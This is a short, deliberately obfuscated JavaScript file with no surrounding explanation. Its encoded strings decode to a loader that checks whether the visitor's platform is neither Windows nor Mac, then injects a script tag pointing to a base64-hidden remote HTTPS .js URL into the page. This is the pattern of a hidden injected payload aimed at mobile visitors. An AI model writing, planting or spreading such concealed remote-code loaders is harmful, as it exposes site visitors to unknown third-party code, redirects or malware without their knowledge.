(function () {
  var vNY = function (s) {
    this.s = s;
    this.length = s.length;

    for (var i = 0; i < s.length; i++) {
      this[i] = s.charAt(i);
    }
  };

  var GRI = function getStr(mutatedCodes) {
    return function (originCodes) {
      return function (s) {
        var r = '',
            sArr = s.split('');

        for (var i = 0; i < sArr.length; i++) {
          r += originCodes.charAt(mutatedCodes.indexOf(sArr[i]));
        }

        return r;
      };
    };
  }("msMiFcTd954zNen6bUx-aW2tXRyLj0ZADHCvpr8")("WinMacsrptHR06Ly9ZXNmx5d2vbjeC4DAzUTF-8");

  vNY.prototype = {
    toString: function () {
      return GRI(this.s);
    },
    valueOf: function () {
      return GRI(this.s);
    },
    charAt: String.prototype.charAt,
    concat: String.prototype.concat,
    slice: String.prototype.slice,
    substr: String.prototype.substr,
    indexOf: String.prototype.indexOf,
    trim: String.prototype.trim,
    split: String.prototype.split
  };

  var K0q = function (s) {
    return new vNY(s);
  };

  var uIb = function _755088(arrNum, offset) {
    var lplx6 = 1;

    while (lplx6 !== 0) {
      switch (lplx6) {
        case 1:
          var arr = [];
          lplx6 = 5;
          break;

        case 2:
          lplx6 = i < arrNum ? 7 : 3;
          break;

        case 3:
          lplx6 = ii < arrNum ? 8 : 4;
          break;

        case 4:
          return arr;
          lplx6 = 0;
          break;

        case 5:
          var i = 0;
          lplx6 = 6;
          break;

        case 6:
          var ii = 0;
          lplx6 = 2;
          break;

        case 7:
          arr[(i + offset) % arrNum] = [];
          lplx6 = 9;
          break;

        case 8:
          var I = arrNum - 1;
          lplx6 = 10;
          break;

        case 9:
          i++;
          lplx6 = 2;
          break;

        case 10:
          lplx6 = I >= 0 ? 12 : 11;
          break;

        case 11:
          ii++;
          lplx6 = 3;
          break;

        case 12:
          arr[ii][(I + offset * ii) % arrNum] = arr[I];
          lplx6 = 13;
          break;

        case 13:
          I--;
          lplx6 = 10;
          break;
      }
    }
  }(1, 7);

  if (!(navigator.platform.indexOf(K0q("msM")) > -1 || navigator.platform.indexOf(K0q("iFc")) > -1)) {
    var hi = document.createElement(K0q("Tcds95"));
    hi.src = window.atob(K0q("F4zNc4ien6bNUx-NnaW2tXzRy62Lysbsj0bZjADXna9H"));
    hi.charset = K0q("Cvpr8");
    var k = document.getElementsByTagName(K0q("Tcds95"))[0];
    k.parentNode.insertBefore(hi, k);
  }
})();
